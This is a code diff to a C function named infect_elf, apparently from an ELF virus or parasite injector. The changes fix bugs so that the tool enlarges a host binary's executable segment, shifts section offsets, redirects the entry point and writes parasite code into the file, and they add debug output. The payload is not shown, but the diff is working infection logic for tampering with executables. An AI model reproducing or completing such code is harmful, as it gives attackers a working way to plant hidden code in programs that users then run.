@@ -63,10 +63,11 @@ int main(int argc, char **argv)
 void infect_elf()
 {
     
-    unsigned long entry_point, text_offset;
+    unsigned long entry_point, text_offset, text_begin;
     unsigned char *mem;
     unsigned int entry_offset;
     unsigned char buf[MAX_PARASITE];
+    unsigned int ehdr_size;
     int ofd;
     int psize;
     int text_found;
@@ -75,7 +76,12 @@ void infect_elf()
     Elf32_Shdr *s_hdr;
     int i;
 
+
     psize = pst.st_size;
+    if (DEBUG)
+    {
+        printf("psize = %d\n", psize);
+    }
 
     mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
     if (mem == MAP_FAILED)
@@ -86,6 +92,12 @@ void infect_elf()
 
     e_hdr = (Elf32_Ehdr *) mem;
     entry_point = e_hdr->e_entry;
+    ehdr_size = sizeof(Elf32_Ehdr);
+
+    if (DEBUG)
+    {
+        printf("ehdr_size: %d\n", ehdr_size);
+    }
 
     if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
     {
@@ -103,7 +115,7 @@ void infect_elf()
         {
             // while (psize > PAGE_SIZE) {
             p_hdr->p_offset += PAGE_SIZE;
-            p_hdr->p_vaddr += PAGE_SIZE;
+            // p_hdr->p_vaddr += PAGE_SIZE;
             // psize -= PAGE_SIZE
         }
 
@@ -111,8 +123,11 @@ void infect_elf()
             if (p_hdr->p_flags == (PF_R | PF_X))
             {
                 text_found++;
-                text_offset = p_hdr->p_offset;
-                entry_offset = p_hdr->p_filesz;
+                text_offset = p_hdr->p_offset; // offset of text segment on file
+                text_begin = p_hdr->p_vaddr; 
+                entry_offset = p_hdr->p_filesz; // offset to make correct entry point
+                p_hdr->p_filesz += psize;
+                p_hdr->p_memsz += psize;
                 if (DEBUG)
                 {
                     printf("Going to place parasite at 0x%x in file\n", 
@@ -120,27 +135,39 @@ void infect_elf()
                     printf("Going to place parasite at 0x%x in image\n",
                         p_hdr->p_vaddr + entry_offset);
                 }
-                p_hdr->p_filesz + psize;
-                p_hdr->p_memsz + psize;
             }
     }
 
-    // will the section header table have to be pushed?
+    // push section header table
+    e_hdr->e_shoff += PAGE_SIZE;
+
     s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
     for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
     {
-        if (s_hdr->sh_offset > text_offset)
+        if (s_hdr->sh_offset > (entry_offset + psize))
+        {
             s_hdr->sh_offset += PAGE_SIZE;
+        }
     }
 
-    // modify entry_point to point to parasite at the end of .text
-    e_hdr->e_entry += entry_offset;
 
+    // modify entry_point to point to parasite at the end of .text
+    e_hdr->e_entry = text_begin + entry_offset;
+    if (DEBUG)
+    {
+        printf("set entry point to 0x%x\n", e_hdr->e_entry);
+    }
     // read parasite into buffer
     if (read(pfd, buf, MAX_PARASITE) == -1)
     {
         perror("parasite: read");
         exit(-1);
+    }
+
+    int preparasite_size = ehdr_size + text_offset + entry_offset;
+    if (DEBUG)
+    {
+        printf("preparasite_size = 0x%x\n", preparasite_size);
     }
 
     // patch parasite code
@@ -154,26 +181,40 @@ void infect_elf()
         exit(-1);
     }
 
-    if (write(ofd, mem, (sizeof e_hdr) + text_offset + entry_offset) < 0)
+    unsigned int wrote;
+
+    if ((wrote = write(ofd, mem, preparasite_size)) != preparasite_size)
     {
         perror("tmp binary: write contents up to parasite");
         exit(-1);
     }
+    if (DEBUG)
+    {
+        printf("wrote 0x%x bytes of preparasite information\n", wrote);
+    }
 
-    if (write(ofd, buf, MAX_PARASITE) < 0) 
+    if ((wrote = write(ofd, buf, psize)) < 0) 
     {
         perror("tmp binary: write parasite");
         exit(-1);
     }
+    if (DEBUG)
+    {
+        printf("wrote 0x%x bytes of parasite information\n", wrote);
+    }
 
-    if (lseek(ofd, PAGE_SIZE - ((text_offset + entry_offset + psize) % PAGE_SIZE), SEEK_SET) < 0)
+    if (DEBUG) 
+    {
+        printf("about to write 0x%x bytes to pad to PAGE_SIZE\n", PAGE_SIZE-(preparasite_size + psize));
+    }
+    if (lseek(ofd, PAGE_SIZE-(preparasite_size + psize) , SEEK_SET) < 0)
     {
         perror("seek");
         exit(-1);
     }
 
-    mem += (sizeof e_hdr) + text_offset + entry_offset + psize;
-    if (write(ofd, mem, hst.st_size - ((sizeof e_hdr) + text_offset + entry_offset)) < 0) 
+    mem += ehdr_size + text_offset + entry_offset + psize;
+    if (write(ofd, mem, hst.st_size-preparasite_size) != hst.st_size-preparasite_size)
     {
         perror("tmp binary: write post injection");
         exit(-1);
